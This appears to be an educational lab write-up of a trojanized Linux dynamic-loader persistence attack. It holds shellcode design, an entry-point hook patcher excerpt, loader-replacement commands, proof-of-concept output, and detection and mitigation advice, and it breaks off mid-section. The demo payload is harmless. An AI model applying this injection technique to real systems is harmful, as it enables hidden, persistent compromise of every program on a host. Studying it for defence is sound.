# Trojanized Dynamic Loader Attack - Complete Technical Analysis

**Author:** Security Research Lab
**Date:** 2025-12-21
**Classification:** Educational / Security Research
**Prerequisites:** Understanding of ELF format, memory layout, x86-64 assembly

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Theoretical Foundation](#2-theoretical-foundation)
3. [Attack Overview](#3-attack-overview)
4. [Lab Environment Setup](#4-lab-environment-setup)
5. [Step-by-Step Implementation](#5-step-by-step-implementation)
6. [Proof of Concept Results](#6-proof-of-concept-results)
7. [Forensic Analysis](#7-forensic-analysis)
8. [Detection Methods](#8-detection-methods)
9. [Mitigations](#9-mitigations)
10. [Conclusion](#10-conclusion)

---

## 1. Executive Summary

This document details a sophisticated persistence technique where an attacker replaces or modifies the system's dynamic linker (`ld-linux.so.2`) to execute malicious code before ANY dynamically-linked program runs on the system.

### Key Findings

| Aspect | Result |
|--------|--------|
| **Attack Feasibility** | Successfully demonstrated |
| **Stealth Level** | High - program executes normally after payload |
| **Persistence** | Survives reboots, affects all dynamic binaries |
| **Required Access** | Root (to replace system loader) or user (per-binary) |
| **Detection Difficulty** | Medium - detectable via hash verification |

### Attack Flow Summary

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        TROJANIZED LOADER ATTACK FLOW                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   User runs: ./program                                                      │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ KERNEL: Reads ELF headers, finds PT_INTERP segment                 │   │
│   │         PT_INTERP points to: /path/to/ld-trojanized.so.2           │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ KERNEL: Loads trojanized loader into memory                        │   │
│   │         Jumps to loader's entry point (0x1f540)                    │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ TROJANIZED LOADER: Entry point hijacked!                           │   │
│   │                                                                     │   │
│   │   0x1f540: JMP 0x2b1a0  ──────────────────────────────────┐        │   │
│   │                                                            │        │   │
│   │   0x2b1a0: ┌──────────────────────────────────────────┐   │        │   │
│   │            │ ★ MALICIOUS SHELLCODE EXECUTES ★         │◄──┘        │   │
│   │            │   - Creates /tmp/PWNED_BY_LOADER         │            │   │
│   │            │   - Could do ANYTHING here               │            │   │
│   │            │   - Keylogger, backdoor, credential theft│            │   │
│   │            └──────────────────────────────────────────┘            │   │
│   │                         │                                           │   │
│   │                         ▼                                           │   │
│   │            Execute original entry code                              │   │
│   │            JMP back to 0x1f548 (continue normal flow)              │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ NORMAL LOADER BEHAVIOR: Loads libc, resolves symbols               │   │
│   │                         Jumps to program's _start                  │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ PROGRAM: Runs completely normally                                  │   │
│   │          User sees expected output                                 │   │
│   │          NO indication of compromise                               │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Theoretical Foundation

### 2.1 The Dynamic Linker's Role

When you execute a dynamically-linked ELF binary on Linux, the kernel doesn't directly run your program. Instead:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    NORMAL PROGRAM EXECUTION FLOW                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   $ ./program                                                               │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────┐                                                           │
│   │   Shell     │  fork() + execve("./program", ...)                        │
│   └─────────────┘                                                           │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                         KERNEL (execve)                             │   │
│   │                                                                     │   │
│   │   1. Open "./program"                                               │   │
│   │   2. Read ELF header (first 64 bytes)                               │   │
│   │   3. Validate: Magic (0x7F 'E' 'L' 'F'), architecture, etc.         │   │
│   │   4. Read Program Headers                                           │   │
│   │   5. Find PT_INTERP segment                                         │   │
│   │        └─► Contains: "/lib64/ld-linux-x86-64.so.2"                  │   │
│   │   6. Load the interpreter (dynamic linker) into memory              │   │
│   │   7. Map program segments (PT_LOAD) into memory                     │   │
│   │   8. Set up initial stack (argc, argv, envp, auxv)                  │   │
│   │   9. Jump to INTERPRETER's entry point (NOT program's!)             │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                   DYNAMIC LINKER (ld-linux.so.2)                    │   │
│   │                                                                     │   │
│   │   1. Process DYNAMIC segment of the program                         │   │
│   │   2. Load required shared libraries (DT_NEEDED)                     │   │
│   │        ├─► libc.so.6                                                │   │
│   │        ├─► libpthread.so.0                                          │   │
│   │        └─► (other libraries)                                        │   │
│   │   3. Perform relocations (fix up addresses)                         │   │
│   │   4. Initialize libraries (call .init_array functions)              │   │
│   │   5. Jump to program's entry point (_start)                         │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│        │                                                                    │
│        ▼                                                                    │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                      YOUR PROGRAM                                   │   │
│   │                                                                     │   │
│   │   _start:                                                           │   │
│   │        └─► __libc_start_main()                                      │   │
│   │                 └─► main()                                          │   │
│   │                                                                     │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.2 The PT_INTERP Segment

Every dynamically-linked ELF binary contains a `PT_INTERP` program header that specifies the path to the dynamic linker:

```
$ readelf -l /bin/ls | grep -A2 INTERP

  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
```

**Key Insight:** The kernel blindly trusts this path. If we can modify it to point to a malicious loader, our code runs first.

### 2.3 Why This Attack Is Powerful

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    WHY TROJANIZED LOADERS ARE DANGEROUS                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 1. PRE-EXECUTION CONTROL                                            │   │
│   │    ─────────────────────────                                        │   │
│   │    Malicious code runs BEFORE:                                      │   │
│   │      • Program's _start                                             │   │
│   │      • Program's main()                                             │   │
│   │      • Any library initialization                                   │   │
│   │      • Any security checks in the program                           │   │
│   │                                                                     │   │
│   │    Timeline:                                                        │   │
│   │    ──────────────────────────────────────────────────────────────►  │   │
│   │    │ Kernel │ EVIL │ ld-linux │ libc │ _start │ main │ program │   │   │
│   │              ▲                                                      │   │
│   │              └── Our code runs HERE                                 │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 2. UNIVERSAL EXECUTION                                              │   │
│   │    ───────────────────                                              │   │
│   │    If system loader is replaced, EVERY program is affected:         │   │
│   │      • /bin/ls                                                      │   │
│   │      • /usr/bin/ssh                                                 │   │
│   │      • /usr/bin/sudo                                                │   │
│   │      • Web servers, databases, everything                           │   │
│   │                                                                     │   │
│   │    One modification = control over ALL dynamic binaries             │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 3. STEALTH CAPABILITY                                               │   │
│   │    ─────────────────                                                │   │
│   │    The trojanized loader can:                                       │   │
│   │      • Hide files from ls (filter readdir results)                  │   │
│   │      • Hide processes from ps (filter /proc reads)                  │   │
│   │      • Hide network connections from netstat                        │   │
│   │      • Intercept and modify any syscall                             │   │
│   │                                                                     │   │
│   │    Result: Nearly undetectable from userspace                       │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │ 4. PERSISTENCE                                                      │   │
│   │    ───────────                                                      │   │
│   │      • Survives reboots (loader is on disk)                         │   │
│   │      • Survives process termination                                 │   │
│   │      • Rarely touched by package managers                           │   │
│   │      • Not monitored by most security tools                         │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Attack Overview

### 3.1 Attack Vectors

There are multiple ways to achieve loader hijacking:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         ATTACK VECTORS                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   VECTOR 1: Replace System Loader (requires root)                           │
│   ───────────────────────────────────────────────                           │
│                                                                             │
│   /lib64/ld-linux-x86-64.so.2 ──► Trojanized version                        │
│                                                                             │
│   Impact: ALL dynamically-linked programs affected                          │
│   Stealth: High (no per-binary modifications)                               │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   VECTOR 2: Patch Binary's PT_INTERP (user or root)                         │
│   ─────────────────────────────────────────────────                         │
│                                                                             │
│   Original:  PT_INTERP → /lib64/ld-linux-x86-64.so.2                        │
│   Modified:  PT_INTERP → /home/attacker/.hidden/evil-ld.so                  │
│                                                                             │
│   Impact: Only modified binaries affected                                   │
│   Stealth: Lower (INTERP path is visible in binary)                         │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   VECTOR 3: Symlink Hijack (requires root)                                  │
│   ────────────────────────────────────────                                  │
│                                                                             │
│   mv /lib64/ld-linux-x86-64.so.2 /lib64/ld-linux-x86-64.so.2.bak            │
│   ln -s /path/to/evil-ld.so /lib64/ld-linux-x86-64.so.2                     │
│                                                                             │
│   Impact: All programs, like Vector 1                                       │
│   Stealth: Medium (symlink is visible)                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.2 Our Approach

For this POC, we use **Vector 2** (safest for lab environment):

1. Copy the legitimate system loader
2. Inject malicious code into the copy
3. Patch a test binary to use our modified loader
4. Demonstrate code execution before program starts

---

## 4. Lab Environment Setup

### 4.1 Directory Structure

```
/home/spider/trojanized-loader-lab/
├── victim.c              # Source code for test program
├── victim                 # Compiled test program (normal)
├── victim_evil            # Patched to use evil loader
├── ld-evil.so.2          # Copy of original loader
├── ld-trojanized.so.2    # Loader with injected shellcode
└── patch_loader.py       # Script to inject shellcode
```

### 4.2 Tools Required

| Tool | Purpose | Installation |
|------|---------|--------------|
| `gcc` | Compile test programs | `apt install build-essential` |
| `readelf` | Analyze ELF binaries | Part of binutils |
| `xxd` | Hex dump/editing | Part of vim |
| `patchelf` | Modify ELF interpreters | `apt install patchelf` |
| `python3` | Run patching script | Usually pre-installed |

---

## 5. Step-by-Step Implementation

### Step 1: Create the Victim Program

**Purpose:** A simple program to demonstrate that malicious code executes before it.

**File: `victim.c`**
```c
/*
 * victim.c - An innocent program that will be targeted
 *
 * This represents any dynamically-linked binary on the system.
 * We'll modify its INTERP header to use our trojanized loader.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void do_sensitive_work(void) {
    printf("[VICTIM] Processing sensitive data...\n");
    printf("[VICTIM] Connecting to database...\n");
    printf("[VICTIM] Transaction complete!\n");
}

int main(int argc, char *argv[]) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════╗\n");
    printf("║         LEGITIMATE BANKING APPLICATION           ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
    printf("\n");

    printf("[VICTIM] PID: %d\n", getpid());
    printf("[VICTIM] Program starting normally...\n");
    printf("[VICTIM] Initializing secure connection...\n");

    do_sensitive_work();

    printf("[VICTIM] Shutting down cleanly.\n");
    printf("\n");

    return 0;
}
```

**Compilation:**
```bash
$ gcc -o victim victim.c
$ file victim
victim: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
        dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ...
```

**Verify Interpreter:**
```bash
$ readelf -l victim | grep interpreter
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
```

---

### Step 2: Analyze the System Loader

**Purpose:** Understand the loader's structure to find injection points.

**Locate the Loader:**
```bash
$ ls -la /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx 1 root root 44 /lib64/ld-linux-x86-64.so.2 ->
    ../lib/x86_64-linux-gnu/ld-linux-x86-64.so.2

$ file /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux),
    statically linked, ...
```

**Examine Entry Point:**
```bash
$ readelf -h /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 | grep Entry
  Entry point address:               0x1f540
```

**Disassemble Entry Point:**
```bash
$ objdump -d /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 \
    --start-address=0x1f540 --stop-address=0x1f560

000000000001f540:
   1f540:   48 89 e7             mov    %rsp,%rdi
   1f543:   e8 88 0c 00 00       call   201d0
   1f548:   49 89 c4             mov    %rax,%r12
   ...
```

**Key Finding:** Entry point at `0x1f540` executes `mov rsp, rdi` then calls a function.

---

### Step 3: Find a Code Cave

**Purpose:** Locate unused space in the binary where we can inject shellcode.

**Concept:** ELF segments are page-aligned (4096 bytes). The space between the end of code and the next segment is often filled with zeros.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CODE CAVE VISUALIZATION                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ELF File Layout:                                                          │
│                                                                             │
│   Offset 0x00000    ┌─────────────────────────────────┐                     │
│                     │ ELF Header                      │                     │
│                     │ Program Headers                 │                     │
│   Offset 0x01000    ├─────────────────────────────────┤                     │
│                     │                                 │                     │
│                     │ .text section (code)            │                     │
│                     │ Entry point at 0x1f540          │                     │
│                     │                                 │                     │
│   Offset 0x2b195    │ Last instruction of .text       │                     │
│   Offset 0x2b196    ├─────────────────────────────────┤                     │
│                     │ 00 00 00 00 00 00 00 00 00 ...  │ ◄── CODE CAVE!      │
│                     │ 00 00 00 00 00 00 00 00 00 ...  │     (padding)       │
│                     │ 00 00 00 00 00 00 00 00 00 ...  │     ~3688 bytes     │
│   Offset 0x2c000    ├─────────────────────────────────┤                     │
│                     │ .rodata section                 │                     │
│                     │                                 │                     │
│                     └─────────────────────────────────┘                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

**Verify Code Cave:**
```bash
$ xxd /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 | grep "0002b1a0"
0002b1a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

**Result:** Found ~3688 bytes of zeros at offset `0x2b1a0` - perfect for shellcode.

---

### Step 4: Design the Shellcode

**Purpose:** Create position-independent code that:
1. Saves all registers (preserve program state)
2. Executes malicious payload (create marker file)
3. Restores all registers
4. Executes original entry point instructions
5. Jumps back to continue normal loader execution

**Shellcode Architecture:**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SHELLCODE STRUCTURE                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   0x2b1a0:  ┌──────────────────────────────────────────────────────────┐    │
│             │ SAVE REGISTERS                                          │    │
│             │   push rax                                               │    │
│             │   push rcx                                               │    │
│             │   push rdx                                               │    │
│             │   push rsi                                               │    │
│             │   push rdi                                               │    │
│             │   push r8-r11                                            │    │
│             └──────────────────────────────────────────────────────────┘    │
│                           │                                                 │
│                           ▼                                                 │
│             ┌──────────────────────────────────────────────────────────┐    │
│             │ MALICIOUS PAYLOAD                                        │    │
│             │                                                          │    │
│             │   ; open("/tmp/PWNED_BY_LOADER", O_WRONLY|O_CREAT, 0644) │    │
│             │   lea rdi, [rip + path_string]                           │    │
│             │   mov rsi, 0x241        ; O_WRONLY|O_CREAT|O_TRUNC       │    │
│             │   mov rdx, 0x1a4        ; 0644 octal                     │    │
│             │   mov rax, 2            ; SYS_open                       │    │
│             │   syscall                                                │    │
│             │   mov r8, rax           ; save fd                        │    │
│             │                                                          │    │
│             │   ; write(fd, message, len)                              │    │
│             │   mov rdi, r8                                            │    │
│             │   lea rsi, [rip + message_string]                        │    │
│             │   mov rdx, message_len                                   │    │
│             │   mov rax, 1            ; SYS_write                      │    │
│             │   syscall                                                │    │
│             │                                                          │    │
│             │   ; close(fd)                                            │    │
│             │   mov rdi, r8                                            │    │
│             │   mov rax, 3            ; SYS_close                      │    │
│             │   syscall                                                │    │
│             └──────────────────────────────────────────────────────────┘    │
│                           │                                                 │
│                           ▼                                                 │
│             ┌──────────────────────────────────────────────────────────┐    │
│             │ RESTORE REGISTERS                                        │    │
│             │   pop r11-r8                                             │    │
│             │   pop rdi                                                │    │
│             │   pop rsi                                                │    │
│             │   pop rdx                                                │    │
│             │   pop rcx                                                │    │
│             │   pop rax                                                │    │
│             └──────────────────────────────────────────────────────────┘    │
│                           │                                                 │
│                           ▼                                                 │
│             ┌──────────────────────────────────────────────────────────┐    │
│             │ EXECUTE ORIGINAL CODE & RETURN                           │    │
│             │   mov rdi, rsp          ; Original first instruction     │    │
│             │   call 0x201d0          ; Original second instruction    │    │
│             │   jmp 0x1f548           ; Continue at entry+8            │    │
│             └──────────────────────────────────────────────────────────┘    │
│                           │                                                 │
│                           ▼                                                 │
│             ┌──────────────────────────────────────────────────────────┐    │
│             │ DATA SECTION                                             │    │
│             │   path_string:  "/tmp/PWNED_BY_LOADER\0"                 │    │
│             │   message:      "[TROJANIZED LOADER] ...\0"              │    │
│             └──────────────────────────────────────────────────────────┘    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

### Step 5: Create the Patcher Script

**Purpose:** Automate the binary patching process.

**File: `patch_loader.py`** (key sections explained)

```python
#!/usr/bin/env python3
"""
Trojanized Loader POC - Binary Patcher

This script:
1. Reads the original loader binary
2. Generates shellcode for the code cave
3. Patches the entry point to jump to shellcode
4. Writes the trojanized loader
"""

import struct

# Configuration
ORIGINAL_ENTRY = 0x1f540      # Loader's entry point
CODE_CAVE_OFFSET = 0x2b1a0    # Where we inject shellcode
MARKER_FILE = b"/tmp/PWNED_BY_LOADER\x00"

def create_entry_hook():
    """
    Create a JMP instruction to redirect entry point to code cave.

    Original:  48 89 e7 e8 88 0c 00 00  (mov rdi,rsp; call ...)
    Patched:   e9 XX XX XX XX ...       (jmp code_cave)

    JMP rel32 format: E9 + 32-bit signed offset
    Offset = target - (source + 5)  ; +5 because JMP is 5 bytes
    """
    jmp_from = ORIGINAL_ENTRY + 5
    jmp_to = CODE_CAVE_OFFSET
    rel_offset = jmp_to - jmp_from   # Calculate relative offset

    # E9 = JMP rel32 opcode
    hook = b"\xe9" + struct.pack("<i", rel_offset)
    return hook  # 5 bytes: e9 5b bc 00 00
```

**The Hook Calculation:**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    ENTRY POINT HOOK CALCULATION                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   BEFORE PATCHING:                                                          │
│   ────────────────                                                          │
│                                                                             │
│   Address    Bytes           Instruction                                    │
│   ───────────────────────────────────────                                   │
│   0x1f540    48 89 e7        mov rdi, rsp                                   │
│   0x1f543    e8 88 0c 00 00  call 0x201d0                                   │
│   0x1f548    49 89 c4        mov r12, rax                                   │
│                                                                             │
│   AFTER PATCHING:                                                           │
│   ───────────────                                                           │
│                                                                             │
│   Address    Bytes           Instruction                                    │
│   ───────────────────────────────────────                                   │
│   0x1f540    e9 5b bc 00 00  jmp 0x2b1a0     ◄── HIJACKED!                  │
│   0x1f545    0c 00 00        (corrupted)                                    │
│   0x1f548    49 89 c4        mov r12, rax                                   │
│                                                                             │
│   OFFSET CALCULATION:                                                       │
│   ───────────────────                                                       │
│                                                                             │
│   target = 0x2b1a0 (code cave)                                              │
│   source = 0x1f540 (entry point)                                            │
│   JMP is 5 bytes, so RIP after JMP = 0x1f540 + 5 = 0x1f545                  │
│                                                                             │
│   offset = target - RIP_after_JMP                                           │
│   offset = 0x2b1a0 - 0x1f545                                                │
│   offset = 0xbc5b                                                           │
│                                                                             │
│   JMP instruction = E9 5B BC 00 00  (little-endian)                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

### Step 6: Run the Patcher

**Command:**
```bash
$ python3 patch_loader.py
```

**Output:**
```
[*] Trojanized Loader POC - Binary Patcher
[*] =================================================

[*] Reading original loader: ld-evil.so.2
[*] Original size: 236616 bytes
[*] Entry point: 0x1f540
[*] Code cave location: 0x2b1a0
[*] Original bytes at entry: 4889e7e8880c00004989c44989e58b15
[*] Generating shellcode...
[*] Shellcode size: 188 bytes
[*] Injecting shellcode at offset 0x2b1a0...
[*] Creating entry point hook...
[*] Hook bytes: e95bbc0000
[*] Patching entry point at 0x1f540...
[*] Patched bytes at entry: e95bbc00000c00004989c44989e58b15
[*] Writing trojanized loader: ld-trojanized.so.2

[+] Patching complete!

[*] Attack summary:
    - Original entry: 0x1f540
    - Redirects to:   0x2b1a0
    - Creates file:   /tmp/PWNED_BY_LOADER
    - Then continues normal execution
```

---

### Step 7: Patch the Victim Binary

**Purpose:** Modify the victim's PT_INTERP to use our trojanized loader.

**Command:**
```bash
$ cp victim victim_evil
$ patchelf --set-interpreter /home/spider/trojanized-loader-lab/ld-trojanized.so.2 victim_evil
```

**Verify:**
```bash
$ readelf -l victim_evil | grep interpreter
      [Requesting program interpreter: /home/spider/trojanized-loader-lab/ld-trojanized.so.2]
```

**What Changed:**

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      PT_INTERP MODIFICATION                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ORIGINAL BINARY (victim):                                                 │
│   ─────────────────────────                                                 │
│                                                                             │
│   $ readelf -l victim | grep interpreter                                    │
│   [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]             │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   PATCHED BINARY (victim_evil):                                             │
│   ─────────────────────────────                                             │
│                                                                             │
│   $ readelf -l victim_evil | grep interpreter                               │
│   [Requesting program interpreter:                                          │
│       /home/spider/trojanized-loader-lab/ld-trojanized.so.2]                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Proof of Concept Results

### 6.1 Running the Original Binary

```bash
$ rm -f /tmp/PWNED_BY_LOADER
$ ./victim

╔══════════════════════════════════════════════════╗
║         LEGITIMATE BANKING APPLICATION           ║
╚══════════════════════════════════════════════════╝

[VICTIM] PID: 64058
[VICTIM] Program starting normally...
[VICTIM] Initializing secure connection...
[VICTIM] Processing sensitive data...
[VICTIM] Connecting to database...
[VICTIM] Transaction complete!
[VICTIM] Shutting down cleanly.

$ ls /tmp/PWNED_BY_LOADER
ls: cannot access '/tmp/PWNED_BY_LOADER': No such file or directory
```

**Result:** Program runs normally, no marker file created.

---

### 6.2 Running the Trojanized Binary

```bash
$ rm -f /tmp/PWNED_BY_LOADER
$ ./victim_evil

╔══════════════════════════════════════════════════╗
║         LEGITIMATE BANKING APPLICATION           ║
╚══════════════════════════════════════════════════╝

[VICTIM] PID: 64157
[VICTIM] Program starting normally...
[VICTIM] Initializing secure connection...
[VICTIM] Processing sensitive data...
[VICTIM] Connecting to database...
[VICTIM] Transaction complete!
[VICTIM] Shutting down cleanly.

$ ls -la /tmp/PWNED_BY_LOADER
-rw-r--r-- 1 spider spider 56 Dec 21 12:42 /tmp/PWNED_BY_LOADER

$ cat /tmp/PWNED_BY_LOADER
[TROJANIZED LOADER] Code executed before program start!
```

**Result:**
- Program runs **identically** to the original
- Marker file **created before program started**
- User sees **no indication of compromise**

---

### 6.3 Visual Comparison

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         EXECUTION COMPARISON                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ORIGINAL (./victim)              TROJANIZED (./victim_evil)               │
│   ═══════════════════              ══════════════════════════               │
│                                                                             │
│   1. Kernel loads                  1. Kernel loads                          │
│      /lib64/ld-linux-x86-64.so.2      ld-trojanized.so.2                    │
│                                                                             │
│   2. Loader entry point            2. Loader entry point                    │
│      0x1f540: mov rdi, rsp            0x1f540: JMP 0x2b1a0 ◄── HIJACKED     │
│      0x1f543: call 0x201d0                                                  │
│      ...                           3. ★ SHELLCODE EXECUTES ★                │
│                                       - Creates marker file                 │
│                                       - Could do ANYTHING                   │
│                                                                             │
│                                    4. Shellcode executes original           │
│                                       entry instructions                    │
│                                                                             │
│                                    5. JMP back to 0x1f548                   │
│                                                                             │
│   3. Normal loader operation       6. Normal loader operation               │
│      - Load libc                      - Load libc                           │
│      - Resolve symbols                - Resolve symbols                     │
│                                                                             │
│   4. Jump to _start                7. Jump to _start                        │
│                                                                             │
│   5. main() executes               8. main() executes                       │
│      [identical output]               [identical output]                    │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   MARKER FILE: Not created         MARKER FILE: CREATED!                    │
│                                    Contains: "[TROJANIZED LOADER]..."       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 7. Forensic Analysis

### 7.1 Binary Differences

**Entry Point Comparison:**

```
Original loader @ 0x1f540:
0001f540: 4889 e7e8 880c 0000 4989 c449 89e5 8b15  H.......I..I....
          ^^^^^^^^
          mov rdi, rsp (normal)

Trojanized loader @ 0x1f540:
0001f540: e95b bc00 000c 0000 4989 c449 89e5 8b15  .[......I..I....
          ^^^^^^^^^^
          JMP 0x2b1a0 (hijacked!)
```

**Code Cave Comparison:**

```
Original loader @ 0x2b1a0:
0002b1a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0002b1b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          Empty padding (nulls)

Trojanized loader @ 0x2b1a0:
0002b1a0: 5051 5256 5741 5041 5141 5241 5348 8d3d  PQRVWAPAQARASH.=
0002b1b0: 5a00 0000 48c7 c641 0200 0048 c7c2 a401  Z...H..A...H....
          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
          Injected shellcode!
```

### 7.2 Hash Comparison

```bash
$ sha256sum /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
6222a16be7f2d458d6870efe6e715fc0c8d45766fb79cf7dcc3125538d703e28

$ sha256sum ld-trojanized.so.2
8f54f57ba0e7bb639b71ff3f9a6d942095675f909c08b3c2a47c50810f6aa5c3
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                  DIFFERENT HASH = MODIFIED BINARY
```

### 7.3 Size Comparison

```bash
$ ls -la /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ld-trojanized.so.2
-rwxr-xr-x 1 root   root   236616  /lib/.../ld-linux-x86-64.so.2
-rwxr-xr-x 1 spider spider 236616  ld-trojanized.so.2
                           ^^^^^^
                           SAME SIZE (code cave injection)
```

**Note:** The file size is identical because we injected into existing padding, not appended data.

---

## 8. Detection Methods

### 8.1 Hash Verification

```bash
# Compare against known-good hash
$ sha256sum /lib64/ld-linux-x86-64.so.2

# Verify against package manager
$ dpkg -V libc6 2>/dev/null | grep ld-linux
# or
$ rpm -V glibc 2>/dev/null | grep ld-linux
```

### 8.2 Check Binary Interpreters

```bash
# Find binaries with unusual interpreters
$ find /bin /usr/bin -type f -executable -exec sh -c \
    'readelf -l "$1" 2>/dev/null | grep -q "interpreter:" && \
     readelf -l "$1" | grep interpreter' _ {} \; | \
    grep -v "/lib64/ld-linux-x86-64.so.2"
```

### 8.3 Analyze Loader Entry Point

```bash
# Check for JMP at entry point (suspicious)
$ xxd -s 0x1f540 -l 5 /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
# Should be: 4889 e7e8 88 (mov rdi, rsp; call ...)
# NOT:       e9XX XXXX XX (jmp - SUSPICIOUS!)
```

### 8.4 Check for Non-Zero Code Caves

```bash
# Legitimate loader should have zeros in padding
$ xxd -s 0x2b1a0 -l 64 /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
# Should be all zeros
```

### 8.5 File Integrity Monitoring

```bash
# Using AIDE
$ aide --check

# Using Tripwire
$ tripwire --check
```

---

## 9. Mitigations

### 9.1 System-Level Protections

| Mitigation | Description | Effectiveness |
|------------|-------------|---------------|
| **Secure Boot** | Verify kernel and initramfs integrity | High |
| **dm-verity** | Read-only verified root filesystem | Very High |
| **IMA/EVM** | Kernel-level integrity measurement | Very High |
| **Read-only /lib** | Mount /lib as read-only | Medium |
| **File integrity monitoring** | Detect changes to critical files | Medium |

### 9.2 Detection Recommendations

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        DETECTION STRATEGY                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. BASELINE HASHES                                                        │
│      ───────────────                                                        │
│      Store SHA256 hashes of:                                                │
│        • /lib64/ld-linux-x86-64.so.2                                        │
│        • /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2                         │
│        • All critical system binaries                                       │
│                                                                             │
│   2. REGULAR VERIFICATION                                                   │
│      ────────────────────                                                   │
│      Daily cron job:                                                        │
│        • Compare current hashes to baseline                                 │
│        • Alert on any mismatch                                              │
│                                                                             │
│   3. BINARY ANALYSIS                                                        │
│      ───────────────                                                        │
│      Check for:                                                             │
│        • Unusual interpreter paths in binaries                              │
│        • JMP instructions at known entry points                             │
│        • Non-zero bytes in expected padding areas                           │
│                                                                             │
│   4. BEHAVIORAL MONITORING                                                  │
│      ─────────────────────                                                  │
